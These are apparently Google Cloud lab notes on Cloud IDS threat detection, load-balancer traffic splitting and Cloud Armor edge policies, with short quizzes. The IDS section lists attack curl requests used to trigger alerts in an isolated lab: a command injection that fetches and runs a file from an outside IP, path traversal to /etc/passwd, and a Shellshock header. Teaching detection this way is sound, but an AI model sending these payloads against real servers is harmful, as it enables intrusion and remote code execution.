In this task, you establish an SSH connection to your attacked virtual machine and simulate attack traffic from a virtual machine to your server. You do this by running a selection of `curl` commands that range from low severity to critical severity.

1. To establish an SSH connection to your attacker virtual machine through IAP, in Cloud Shell, run the following command:

```
gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap
```



**Note:** You are now in the shell of your attacker VM and not the Cloud Shell machine.

1. Run the following `curl` requests in sequence to simulate low, medium, high, and critical severity alerts on the IDS:

**Low Severity:**

```
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
```



**Medium Severity:**

```
curl http://192.168.10.20/?item=../../../../WINNT/win.ini
curl http://192.168.10.20/eicar.file
```



**High Severity:**

```
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
```



**Critical Severity:**

```
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
```



1. Exit the attacker virtual machine shell and return to Cloud Shell:

```
exit
```



#### Task 8. Review threats detected by Cloud IDS

In this task, you review the various attack traffic captured by the Cloud IDS in the Cloud console. The captured attack traffic profiles provide details of each threat.

1. In the Google Cloud console, in the **Navigation menu** (![Navigation menu](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **Network Security > Cloud IDS**.
2. Click the **Threats** tab.

The Cloud IDS captured various attack traffic profiles and provided the details on each threat. You may need to click **Refresh** if you do not see any threats. You now dive a little deeper and view threat details.

1. Locate the **Bash Remote Code Execution Vulnerability** threat, click **More** (![More Button](https://cdn.qwiklabs.com/2ufrDePg5inKfodUoT2Kib4oE7II7emYn%2BypCC85FjQ%3D)), and then select **View threat details**.

**Note:** You may have noticed that there are multiple threats that produce the same name, for example, “Bash Remote Code Execution Vulnerability”. This is expected behavior.



If you look closely, you will see that the session IDs of the threats are different. Since both VMs created are in the same subnet, we are seeing mirrored packets for both the client and server. Outbound packets from the client are being mirrored to IDS, and additionally, inbound packets to the server are being mirrored to IDS.

1. Now you view the details of this incident in Cloud Logging. To return to the **Threats** page, click the left arrow.
2. Click the **Threats** tab.
3. Locate the **Bash Remote Code Execution Vulnerability**, click **More**, and then select **View threat logs**.

A new Cloud Logging tab opens that displays the same details. This enables you to send the logs to Cloud Storage, Chronicle, or any SIEM/SOAR. You can also create custom workflows to take remediation action based on alerts, like creating a Cloud Function that triggers on an alert and creating or updating a firewall rule to block the IP address, or creating or updating a Google Cloud Armor policy.

Click *Check my progress* to verify the objective.

Getting Started with Cloud IDS.



#### Congratulations!

In this lab, you did the following:

1. Created a new VPC and deployed a Cloud IDS endpoint.
2. Deployed two VMs, created a packet mirroring policy, and then sent attack traffic.
3. Verified that the Cloud IDS captured the threats by viewing the threat details in the Cloud console and the threat logs in Cloud Logging.



### Quiz

1. Which type of IAM member belongs to an application or virtual machine instead of an individual end user?
- Cloud Identity domain
- Google account
- Google group
- **Service account**

Correct! A service account is a special Google account that belongs to  your application or a virtual machine, instead of to an individual end  user.

2. Which IAM role contains permissions to create, modify, and delete networking resources, except for firewall rules and SSL certificates?
- Network viewer
- Security viewer
- Security administrator
- **Network administrator**

Correct! The network administrator role grants permission to create,  modify, and delete networking resources, except for firewall rules and  SSL certificates.



## Advanced Security Monitoring and Analysis

### Quiz

1. What is the primary purpose of Packet Mirroring in network security?

- To filter out unwanted traffic from a network.
- To encrypt network traffic for privacy.
- **To create a duplicate copy of network traffic for analysis.**
- To redirect traffic to a different network interface.

Correct! This is the core function of Packet Mirroring, enabling deep analysis of network data.

2. Which of the following is a key benefit of using Packet Mirroring for network security analysis?

- **It enables the capture and inspection of traffic without impacting network performance.**
- It directly prevents cyberattacks.
- It automatically patches vulnerabilities in software.
- It reduces network bandwidth usage.

Correct. This is the primary benefit of packet mirroring. It allows  security tools to analyze network traffic without interfering with the  actual flow of data.





# 07 Networking in Google Cloud: Load Balancing

## Hybrid Load Balancing and Traffic Management

### LAB - Configuring Traffic Management with a Load Balancer

#### Overview

Google Cloud load balancers offer traffic management capabilities that vary by load balancer.

In this lab, you create a regional internal Application Load Balancer with two backends. Each backend will be an instance group. You will configure the load balancer to create a blue-green deployment.

The blue deployment refers to the current version of your application, and the green deployment refers to a new application version. You configure the load balancer to send 70% of the traffic to the blue deployment and 30% to the green deployment. When you’re finished, the environment will look like this:

![The image shows a VPC network with two subnets, each with a managed instance group. One subnet is used for the blue deployment, and the other is used for the green deploynment. Client traffic to the subnets is handled by the load balancer.](https://cdn.qwiklabs.com/FgrZkcSEqghVxKV14KPVgNzTUMo0lQfmqTgpG45%2BTYA%3D)

#### Objectives

In this lab, you perform the following tasks:

- View the Google Cloud infrastructure that the load balancer will use.
- Create a regional internal Application Load Balancer with two backends.
- Implement traffic management on the load balancer.
- Test the load balancer.

#### Setup

For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.

1. Sign in to Qwiklabs using an **incognito window**.
2. Note the lab's access time (for example, `1:15:00`), and make sure you can finish within that time.
   There is no pause feature. You can restart if needed, but you have to start at the beginning.
3. When ready, click **Start lab**.
4. Note your lab credentials (**Username** and **Password**). You will use them to sign in to the Google Cloud Console.
5. Click **Open Google Console**.
6. Click **Use another account** and copy/paste credentials for **this** lab into the prompts.
   If you use other credentials, you'll receive errors or **incur charges**.
7. Accept the terms and skip the recovery resource page.

**Note:** Do not click **End Lab** unless you have finished the lab or want to restart it. This clears your work and removes the project.

#### Task 1. View the Google Cloud infrastructure that the load balancer will use

##### **View the network, firewall rules, and Cloud Router**

The network *my-internal-app*, with *subnet-a* and *subnet-b* and firewall rules for RDP, SSH, and ICMP traffic, has been configured for you. Additional firewall rules have been configured to allow communication between the load balancer and the backends. Later, you create a regional internal Application Load Balancer in the my-internal-app network.

1. In the Google Cloud console, in the **Navigation menu** (![Navigation menu](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **VPC network > VPC networks**.

   Each Google Cloud project starts with the *default* network. In addition, the *my-internal-app* network was created for you as part of your network diagram.

   Note the *my-internal-app* network with its subnets: *subnet-a* and *subnet-b*. Both subnets are in the `Region` region.

   Managed instance groups in *subnet-a* and *subnet-b* were also created for you.

2. (Optional) Click **subnet-a** and observe its configuration.

3. (Optional) Click **subnet-b** and observe its configuration.

4. In the **Navigation menu** (![Navigation menu](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **VPC network > Firewall**.
   Note the following firewall rules that were created for you:

   | Firewall rule          | Purpose                                       |
   | :--------------------- | :-------------------------------------------- |
   | app-allow-icmp         | Allows ICMP communication                     |
   | app-allow-ssh-rdp      | Allows SSH and RDP over TCP ports 22 and 3389 |
   | fw-allow-health-checks | Allow health checks over TCP port 80          |
   | fw-allow-lb-access     | Allow traffic in the 10.10.0.0/16 subnet      |

5. (Optional) View the contents of each firewall rule.

6. In the Google Cloud console, on the **Navigation menu** (![Navigation menu](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **View All Products**. In the left hand pane, select **Networking > Network Connectivity > Cloud Routers**.
   Note the *nat-router* Cloud Router that was created for the *my-internal-app* network. The load balancer will use this Cloud Router.

##### **View the instance groups**

The instance groups were created for you. Next, you will observe the configuration details.

1. On the **Navigation menu**, click **Compute Engine > VM instances**.
   Note the two VM instances that start with *instance-group-1* and *instance-group-2*.
2. Click **instance-group-1**.
3. Scroll to **Network interfaces**.
   Note that the instance group is in *subnet-a*, and its internal IP address is *10.10.20.2*.
4. Return to the **VM instances** page, and repeat steps 2 and 3 for **instance-group-2**.
   Note that this instance group is in *subnet-b*, and its internal IP address is *10.10.30.2*.

##### **Create a VM for testing**

You create a VM called *utility-vm* in *subnet-a* of the *my-internal-app* network and use it to test the load balancer.

1. Return to the **VM instances** page, and click **Create instance**.

2. Specify the following, and leave the remaining settings as their defaults:

   | Property     | Value (type value or select option as specified) |
   | :----------- | :----------------------------------------------- |
   | Name         | utility-vm                                       |
   | Region       | `<REGION>`                                       |
   | Zone         | `<ZONE 1>`                                       |
   | Series       | E2                                               |
   | Machine type | e2-medium (2vCPU, 4 GB memory)                   |

3. Click **OS and storage**.

   Click **Change** to begin configuring your boot disk and select the following values:

   - **Operating system**: `Debian`
   - **Version**: `Debian GNU/Linux 12 (bookworm) x86/64, amd64`

4. Click **Networking**.

5. For **Network interfaces**, click **default**.

6. Set the network interface properties and values as shown in the following table, and leave the remaining properties as their default values:

   | Property                      | Value (type value or select option as specified) |
   | :---------------------------- | :----------------------------------------------- |
   | Network                       | my-internal-app                                  |
   | Subnetwork                    | subnet-a                                         |
   | Primary internal IPv4 address | Ephemeral (Custom)                               |
   | Custom ephemeral IP address   | 10.10.20.50                                      |
   | External IPv4 address         | None                                             |

7. Click **Done**.

8. Click **Create**.
   Wait for the new VM to be created.

##### Verify the backends

1. For **utility-vm**, click **SSH** to launch a terminal and connect.
   If you see the **Allow SSH-in-browser to connect to VMs** pop-up, click **Authorize**.
2. To verify the welcome page for **instance-group-1-xxxx**, run the following command:

```
curl 10.10.20.2
```



The output is shown below. Note that the server location is set to `Zone 1`.

```
<h1>Internal Load Balancing Lab</h1><h2>Client IP</h2>Your IP address : 10.10.20.50<h2>Hostname</h2>Server Hostname:
 instance-group-1-1zn8<h2>Server Location</h2>Region and Zone: Zone 1
```

1. To verify the welcome page for **instance-group-2-xxxx**, run the following command:

```
curl 10.10.30.2
```



The output is shown below. Note that the server location is set to `Zone 2`.

```
<h1>Internal Load Balancing Lab</h1><h2>Client IP</h2>Your IP address : 10.10.20.50<h2>Hostname</h2>Server Hostname:
 instance-group-2-q5wp<h2>Server Location</h2>Region and Zone: Zone 2
```



Which of these fields identifies the location of the backend?



Server Location



Client IP



Server Hostname



Submit



**Note:** This will be useful when verifying that the load balancer sends traffic to both backends.

1. Close the SSH terminal to **utility-vm**:

```
exit
```



Click **Check my progress** to verify the objective.

Finish setting up the network infrastructure.



Check my progress



#### Task 2. Configure the load balancer

Configure a regional internal Application Load Balancer to balance traffic between the two backends (*instance-group-1* in `Zone 1` and *instance-group-2* in `Zone 2`), as shown (the region and zones may vary as per the lab requirement):

![The image shows a VPC network with two subnets, each with a managed instance group. One subnet is used for the blue deployment, and the other is used for the green deploynment. Client traffic to the subnets is handled by the load balancer.](images/FgrZkcSEqghVxKV14KPVgNzTUMo0lQfmqTgpG45%2BTYA%3D.png)

##### **Start the configuration**

1. In the Google Cloud console, in the **Navigation menu** (![Navigation menu](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **View All Products**. In the left hand pane, select **Networking > Network Services > Load balancing**.
2. Click **Create load balancer**.
3. Under **Application Load Balancer (HTTP/HTTPS)**, click **next**.
4. For **Public facing or internal**, select **internal** and click **next**. This selection creates a regional internal Application Load Balancer. This choice requires the backends to be in a single region `Region`.
5. For **Cross-region or single region deployment**, select **Best for regional workloads** and click **next**.
6. Click **Configure**.
7. For **Name**, type **my-ilb**
8. For **Region**, select **`Region`**
9. For **Network**, select **my-internal-app**.

The proxy servers that implement the regional internal Application Load Balancer require IP addresses. These IP addresses are allocated automatically from a subnet that you specify.

1. Under **Proxy-only subnet required**, click **Reserve subnet**.
2. For **Name**, type **my-proxy-subnet**
3. For **IP address range**, type **10.10.40.0/24**
4. Click **Add**.
   Wait for the proxy-only subnet to be created. When that is successful, the console displays the name of the proxy-only subnet followed by the IP address range that you specified.

##### **Configure the blue-service backend**

This backend service refers to the present ("blue") version of your application.

1. Click **Backend configuration**.

2. For **Backend configuration**, for **Create or select backend service**, select **Create a backend service**.

3. For **Name**, type **blue-service**.

4. In **Backends**, specify the following, and leave the remaining settings as their defaults:

   | Property       | Value (type value or select option as specified) |
   | :------------- | :----------------------------------------------- |
   | Instance group | instance-group-1                                 |
   | Port numbers   | 80                                               |

5. Click **Done**.

6. For **Health check**, select **Create a health check**.

7. Specify the following, and leave the remaining settings as their defaults:

   | Property            | Value (select option as specified) |
   | :------------------ | :--------------------------------- |
   | Name                | blue-health-check                  |
   | Protocol            | TCP                                |
   | Port                | 80                                 |
   | Check interval      | 10 seconds                         |
   | Timeout             | 5 seconds                          |
   | Healthy threshold   | 2                                  |
   | Unhealthy threshold | 3                                  |

**Note:** Health checks determine which instances can receive new connections. This HTTP health check polls instances every ten seconds and waits up to five seconds for a response. After two successful probe attempts, the backend is considered to be healthy. After three failed attempts, the backend is considered to be unhealthy.

1. Click **Save**.
2. Click **Create**.
3. Verify that there is a blue check mark next to **Backend configuration** in the Google Cloud console. If there isn't, double-check that you have completed all the steps above.

##### **Configure the green-service backend**

This backend service refers to the new ("green") version of your application.

1. For **Backend configuration**, for **Create or select backend service**, select **Create a backend service**.

2. For **Name**, type **green-service**.

3. In **Backends**, specify the following, and leave the remaining settings as their defaults:

   | Property       | Value (type value or select option as specified) |
   | :------------- | :----------------------------------------------- |
   | Instance group | instance-group-2                                 |
   | Port numbers   | 80                                               |

4. Click **Done**.

5. For **Health check**, select **Create a health check**.

6. Specify the following, and leave the remaining settings as their defaults:

   | Property            | Value (select option as specified) |
   | :------------------ | :--------------------------------- |
   | Name                | green-health-check                 |
   | Protocol            | TCP                                |
   | Port                | 80                                 |
   | Check interval      | 10 seconds                         |
   | Timeout             | 5 seconds                          |
   | Healthy threshold   | 2                                  |
   | Unhealthy threshold | 3                                  |

7. Click **Save**.

8. Click **Create**.

Under **Backend services**, you should now see two entries: one for the blue-service and another for the green-service. If you do not see the green-service, you will need to re-do the task *Configure the green-service backend*.

1. Click **Ok**.

##### **Configure the "blue-green" routing rule**

Create a routing rule that routes 70% of traffic to the blue-service and 30% of traffic to the green service.

1. Click **Routing rules**.
2. In the **Routing rules** panel, for **Mode**, select **Advanded host and path rule**.
3. Click **Add host and path rule**.
4. For **Hosts**, type *****. The * (asterisk) matches all hosts.
5. Traffic management is configured using YAML format. Examine the following YAML code, and then copy and paste it into line 1 of the multi-line field **Path matcher (matches, actions, and services)**.

```
defaultService: regions/Region/backendServices/blue-service
name: matcher1
routeRules:
 - matchRules:
     - prefixMatch: /
   priority: 0
   routeAction:
     weightedBackendServices:
       - backendService: regions/Region/backendServices/blue-service
         weight: 70
       - backendService: regions/Region/backendServices/green-service
         weight: 30
```



1. Click **Done**.

##### **Configure the default routing rule**

When traffic does not match any of the other routing rules, the load balancer uses the default routing rule. Even though the rule you configured is designed to match all traffic, the default routing rule is required. You will configure the default routing rule to use the blue-service backend.

1. Click **(Default) Route traffic to backend "" for any unmatched hosts**.
2. In the **Edit host and path rule** panel, for **Service**, select **blue-service**, and then click **Done**.

##### **Configure the frontend**

The frontend forwards traffic to the backends.

1. Click **Frontend configuration**.

2. Specify the following, and leave the remaining settings as their defaults:

   | Property                    | Value (type value or select option as specified) |
   | :-------------------------- | :----------------------------------------------- |
   | Subnetwork                  | subnet-b                                         |
   | IP address                  | Ephemeral (Custom)                               |
   | Custom ephemeral IP address | 10.10.30.5                                       |

3. Click **Done**.

##### **Review and create the load balancer**

1. (Optional) Click **Review and finalize**. Review the **Backend** and **Frontend**.
2. Click **Create**.
   Wait for the load balancer to be created before starting the next task.

Click **Check my progress** to verify the objective.

Configure the load balancer.



Check my progress



#### Task 3. Test the load balancer

Verify that the *my-ilb* IP address forwards most of the traffic to the *blue-service* running on *instance-group-1* in *`Zone 1`*.

##### **Access the load balancer**

1. In the **Navigation menu**, click **Compute Engine > VM instances**.
2. For **utility-vm**, click **SSH** to launch a terminal and connect.
3. To verify that the load balancer forwards traffic, run the following command:

```
curl 10.10.30.5
```



The output should look like this:

```
<h1>Internal Load Balancing Lab</h1><h2>Client IP</h2>Your IP address : 10.10.20.50<h2>Hostname</h2>Server Hostname:
 instance-group-2-1zn8<h2>Server Location</h2>Region and Zone: YOUR_LAB_ZONE
```

As expected, traffic is forwarded from the load balancer (10.10.30.5) to either the blue-service backend or the green-service backend.

1. Run the same command a few times:

```
curl 10.10.30.5
curl 10.10.30.5
curl 10.10.30.5
curl 10.10.30.5
curl 10.10.30.5
curl 10.10.30.5
curl 10.10.30.5
curl 10.10.30.5
curl 10.10.30.5
curl 10.10.30.5
```



Most responses should come from *instance-group-1* in `Zone 1`, which is the blue-service. Fewer responses come from *instance-group-2* in `Zone 2`, which is the green-service. (Recall that you configured the load balancer to route 70% of the traffic to the blue-service.) If you do not see that most responses come from *instance-group-1*, run the commands again.

#### Task 4. Review

In this lab, you created two managed instance groups in the `Region` region. You also created some firewall rules. The firewall rules allow traffic from clients and the health checkers to the managed instance groups. You configured a regional internal Application Load Balancer, using the managed instance groups as backends. Finally, you tested the load balancer to ensure that it works as expected.



### Quiz

1. Where would you configure traffic management for a load balancer?

- In the load balancer frontend
- In the load descriptor
- In the load balancer backend
- **In the URL map**

Correct. The URL map contains rules that define the criteria to use to route incoming traffic to a backend service.

2. You can use hybrid load balancing to connect these environments:

- **Google Cloud, other public clouds, and on-premises**
- Google Cloud, AWS, and on-premises
- Google Cloud and on-premises
- Google Cloud and AWS

Correct. You can connect any destination that you can reach by using a  Google hybrid connectivity product and that can be reached with a valid  IP:Port combination.

3. When you use the internal IP address of the forwarding rule to specify an internal Network Load Balancer next hop, the load balancer can only be:

- In the same subnet as the next hop route or a Shared VPC network.
- In the same subnet as the next hop route.
- In the same VPC network as the next hop route.
- **In the same VPC network as the next hop route or in a peered VPC network.**

Correct. When you use an internal IP address to specify the next hop,  the load balancer can be in the same VPC network or a peered VPC  network.





## Caching and Optimizing Load Balancing

### LAB - Defending Edge Cache with Cloud Armor

#### Overview

[Google Cloud Armor](https://cloud.google.com/armor) [edge security policies](https://cloud.google.com/armor/docs/security-policy-overview#edge-policies) allow you to restrict access to cached objects on [Cloud CDN](https://cloud.google.com/cdn) (Content Delivery Network) and Cloud Storage. Edge security policies are deployed and enforced at the outermost perimeter of Google's network, upstream of where the Cloud CDN cache resides. Reasons to do this include ensuring that your users do not access objects in storage buckets from restricted geographies, or ensuring that your media distribution is filtering on the geographies that you have a license to do so.

In this lab you create a Google Cloud Storage bucket, upload an image to it, bind it to a load balancer, and then enable Cloud CDN and Cloud Armor edge security policies on it.

##### What you'll learn

In this lab, you learn how to:

- Set up a Cloud Storage Bucket with cacheable content
- Create an edge security policy to protect the content
- Validate that the edge security policy is working as expected

#### Setup and requirements

##### Before you click the Start Lab button

Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources are made available to you.

This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.

To complete this lab, you need:

- Access to a standard internet browser (Chrome browser recommended).

**Note:** Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.

- Time to complete the lab—remember, once you start, you cannot pause a lab.

**Note:** Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.

##### How to start your lab and sign in to the Google Cloud console

1. Click the **Start Lab** button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:

   - The Open Google Cloud console button
   - Time remaining
   - The temporary credentials that you must use for this lab
   - Other information, if needed, to step through this lab

2. Click **Open Google Cloud console** (or right-click and select **Open Link in Incognito Window** if you are running the Chrome browser).

   The lab spins up resources, and then opens another tab that shows the Sign in page.

   ***Tip:\*** Arrange the tabs in separate windows, side-by-side.

   **Note:** If you see the **Choose an account** dialog, click **Use Another Account**.

3. If necessary, copy the **Username** below and paste it into the **Sign in** dialog.

   ```
   "Username"
   ```

   

   You can also find the Username in the Lab Details pane.

4. Click **Next**.

5. Copy the **Password** below and paste it into the **Welcome** dialog.

   ```
   "Password"
   ```

   

   You can also find the Password in the Lab Details pane.

6. Click **Next**.

   **Important:** You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.

   **Note:** Using your own Google Cloud account for this lab may incur extra charges.

7. Click through the subsequent pages:

   - Accept the terms and conditions.
   - Do not add recovery options or two-factor authentication (because this is a temporary account).
   - Do not sign up for free trials.

After a few moments, the Google Cloud console opens in this tab.

**Note:** To access Google Cloud products and services, click the **Navigation menu** or type the service or product name in the **Search** field. ![Navigation menu icon and Search field](images/9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D.png)

##### Before you begin

- In Cloud Shell, set your Project ID and create an environment variable for it:

```
export PROJECT_ID=$(gcloud config get-value project)
echo $PROJECT_ID
gcloud config set project $PROJECT_ID
```



#### Task 1. Create a Cloud Storage bucket and upload an object

The Cloud Storage bucket will be the origin source for Cloud CDN.

1. In the console, go to **Navigation menu (![Navigation menu](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D))** > **Cloud Storage** > **Buckets**.
2. To create a new Cloud Storage bucket, click **CREATE**.
3. Set the bucket name as `Bucket Name`
4. Click **Continue**.
5. For **Location type**, select `Region`, and choose `Bucket Region`
6. Click **Continue**.
7. The default storage class for your bucket is `Standard`. Click **Continue**.
8. Uncheck `Enforce public access prevention on this bucket` checkbox under **Prevent public access**.
9. Choose **Fine-grained** under **Access Control**.
10. Click **Continue**.
11. Click **Create**.

That's it — you've just created a Cloud Storage bucket!

##### Upload an Object to the bucket

Now upload an object into the bucket, which you will use later. By default, Cloud Storage buckets are private. As part of this lab, you will make the object available to the Internet.

1. Run the following command in Cloud Shell, to download an image to Cloud Shell. A Google image from the Google homepage is used for this lab.

```
wget --output-document google.png https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png
```



1. Use the `gsutil cp` command to upload the image from the Cloud Shell to the bucket you created:

```
gsutil cp google.png gs://Bucket Name
```



1. Remove the downloaded image from Cloud Shell:

```
rm google.png
```



1. Locate the object you have uploaded to the bucket by navigating to **Cloud Storage > Buckets > `Bucket Name`**.
2. Now, click on the three dots on the right side of the object you uploaded and click **Edit access**.
3. Click on **Add Entry** and set the entity as **Public** from the drop-down list.
4. Click **Save**.

![Edit access page, which lists the entities and includes the Save and Cancel buttons](images/b7J%2FDa%2FQs1ii9RJbtLB9PEBijeY9rdhukZsgf0V76Y0%3D.png)

Click **Check my progress** to verify the objective.

Create a Cloud Storage Bucket and upload an object



Check my progress



#### Task 2. Create a Load Balancer

Cloud CDN and Cloud Armor are components that can be tied to Google's global [Cloud Load Balancing](https://cloud.google.com/load-balancing). In this section, you create an HTTP Load balancer.

1. In the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **View All Products > Network services** > **Load Balancing**.
2. Click **+CREATE LOAD BALANCER**.
3. Under Type of **load balancer**, select **Application Load Balancer (HTTP/HTTPS)** and click **NEXT**.
4. Under **Public facing or internal**, select **Public facing (external)** and click **NEXT**.
5. For **Global or single region deployment**, select **Best for global workloads** and click **NEXT**.
6. For **Load balancer generation**, select **Global external Application Load Balancer** and click **NEXT**.
7. Click **CONFIGURE** button.
8. Name the load balancer as `edge-cache-lb`.

##### Create frontend configuration

To create the frontend configuration:

1. Click on **Frontend configuration**.
2. For the frontend configuration use HTTP (though HTTPS also works if you have a certificate) and an ephemeral IP address and ensure that you have selected the premium tier network. This is by default.
3. Click **Done**.

![Frontend configuration page, which includes the load balancer's description](https://cdn.qwiklabs.com/W%2Ftq7MRoTnPDw%2Bvl3uNSZwxbwFEE1txmCee%2FHTIZ8yM%3D)

##### Create backend configuration

To create the backend configuration:

1. Click on **Backend configuration**.
2. For **Backend services & backend buckets**, click **Create a backend bucket**.
3. Set the **Backend bucket name** to `lb-backend-bucket`.
4. In the next field, select the Cloud Storage bucket created earlier by clicking the **Browse** button.
5. Leave all other values at their defaults.
6. Click **Create**.

##### Create host and path rules

To create host and path rules:

1. Click on **Routing rules** on the left.
2. Select **simple host and path rule** under Mode to send any request to the bucket. This is the default option.

##### Review and create the HTTP Load Balancer

To review and create the HTTP Load Balancer:

1. Click on **Review and finalize**.
2. Review the **Backend services** and **Frontend**.
3. Click on **Create**.

##### Get Load Balancer IP

To get the Load Balancer IP from the console:

- Click the load balancer name in the list of load balancers for the project. Note the IPv4 address of the load balancer for the next task. Refer to it as `[LOAD_BALANCER_IP]`.

![The Details page, which includes the highlighted IP:Port address](https://cdn.qwiklabs.com/gEIAdRhQ0Wllm2LutPBRlMAcAgXNbrZH%2FUMny9AgaGI%3D)

##### Query the Load Balancer

After a couple minutes, query the load balancer for the object you uploaded. You will need the load balancer IP address and the name of the image.

1. Run the following from CloudShell and replace the LOAD_BALANCER_IP with the IPv4 address of the load balancer:

```
curl -svo /dev/null http://LOAD_BALANCER_IP/google.png
```



**Note:** It might take up to 5 minutes to access the HTTP Load Balancer.

**Output:**

```
student-cloudshell% curl -svo /dev/null http://34.98.81.123/google.png
*   Trying 34.98.81.123...
* TCP_NODELAY set
* Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)
> GET /google.png HTTP/1.1
> Host: YOUR_IP
> User-Agent: curl/7.64.1
> Accept: */*
>
< HTTP/1.1 200 OK
< X-GUploader-UploadID: ADPycdtoILI76KVsvBvdVGvSfzaxys1m3zYqCepBrmJxAI48ni24cWCRIdNu-53PX3DS6iycxp6xwFbMpwtcHHZQUQmEBxAgng
< Expires: Mon, 13 Dec 2021 22:58:26 GMT
< Date: Mon, 13 Dec 2021 21:58:26 GMT
< Cache-Control: public, max-age=3600
< Last-Modified: Mon, 13 Dec 2021 21:45:57 GMT
< ETag: "8f9327db2597fa57d2f42b4a6c5a9855"
< x-goog-generation: 1639431957957903
< x-goog-metageneration: 2
< x-goog-stored-content-encoding: identity
< x-goog-stored-content-length: 5969
< Content-Type: image/png
< x-goog-hash: crc32c=TeiHTA==
< x-goog-hash: md5=j5Mn2yWX+lfS9CtKbFqYVQ==
< x-goog-storage-class: STANDARD
< Accept-Ranges: bytes
< Content-Length: 5969
< Server: UploadServer
```

1. Run a few queries with this command:

```
for i in `seq 1 50`; do curl http://LOAD_BALANCER_IP/google.png; done
```



##### Confirm content served by Cloud CDN

- Validate that your content is being served from the CDN via CDN or Load Balancing Monitoring by navigating to **Network Services > Cloud CDN**.

![Cloud CDN overview page, with one result populated](images/7UEDVoyLD6cXCvf7GPS11Wg9EXVz0WD57IqpPKT3ocM%3D.png)

You should be able to get close to a 100% hit ratio.

Click **Check my progress** to verify the objective.

Create a Load Balancer



Check my progress



#### Task 3. Delete the object from Cloud Storage bucket

Now that the cache is populated, delete the object from the bucket. This will reinfore that you are applying the policy to the cache and not the backend.

1. In the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **Cloud Storage > Buckets > `Bucket Name`**.
2. Select the object and delete it by clicking the **Delete** button at the top.
3. Click **Delete** at the prompt.

Click **Check my progress** to verify the objective.

Delete the object from Cloud Storage bucket



Check my progress



#### Task 4. Create an edge security policy

Cloud Armor policies are substantiated outside of the HTTP Load Balancer. Once the Cloud Armor policy is deployed, you can then associate it with one or more HTTP Load Balancer Backend Service or Bucket resources, referred to as a Target.

1. In the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **View All Products > Network Security > Cloud Armor policies** and click **Create Policy**.

1. Set the following values, leave all other values at their defaults and click **Next Step**:

| Property            | Value (type value or select option as specified) |
| :------------------ | :----------------------------------------------- |
| Name                | edge-security-policy                             |
| Policy type         | Edge security policy                             |
| Default rule action | Deny                                             |

1. In **Apply policy to targets** section, click **Add Target** and set the following values:

| Property                | Value                                               |
| :---------------------- | :-------------------------------------------------- |
| Type 1                  | Backend bucket (external application load balancer) |
| Backend Bucket target 1 | lb-backend-bucket                                   |

1. Click **Done**.
2. Click **Create Policy**.

##### Validate Edge Security Policy

Now that you've created an edge security policy in front of the back-end bucket, validate that it works as expected.

###### Check the security policy

After a few minutes have passed, you can check that the Cloud Armor policy is running.

From the command line, run the following command, which gives you a 403:

```
curl -svo /dev/null http://LOAD_BALANCER_IP/google.png
```



A 403 error occurs when you do not have permission to accessing a web page or something on a web server.

**Output:**

```
curl -svo /dev/null http://34.98.81.123/google.png
*   Trying 34.98.81.123...
* TCP_NODELAY set
* Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)
> GET /google.png HTTP/1.1
> Host: YOUR_IP
> User-Agent: curl/7.64.1
> Accept: */*
>
< HTTP/1.1 403 Forbidden
< X-GUploader-UploadID: ADPycdtS6FtJOGIsiWYDrAAE8VFeQuNutcvbGoQe2t8EZxsuspVtmCjyiTv_P3CNktroHMOGFXkTCfG-Jj-rUO60ZGPpEbpqcw
< Content-Type: application/xml; charset=UTF-8
< Content-Length: 111
< Date: Mon, 13 Dec 2021 23:09:35 GMT
< Expires: Mon, 13 Dec 2021 23:09:35 GMT
< Cache-Control: private, max-age=0
< Server: UploadServer
```

###### Investigate the logs

Next, you check the logs to see the enforced edge security policy.

1. In the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **View All Products > Observability > Logging > Logs Explorer**.
2. Enter the below snippet into the query box and click **Run Query**:

```
resource.type:(http_load_balancer) AND jsonPayload.@type="type.googleapis.com/google.cloud.loadbalancing.type.LoadBalancerLogEntry" AND severity>=WARNING
```



1. Note the `403 response` and the enforced security policy.

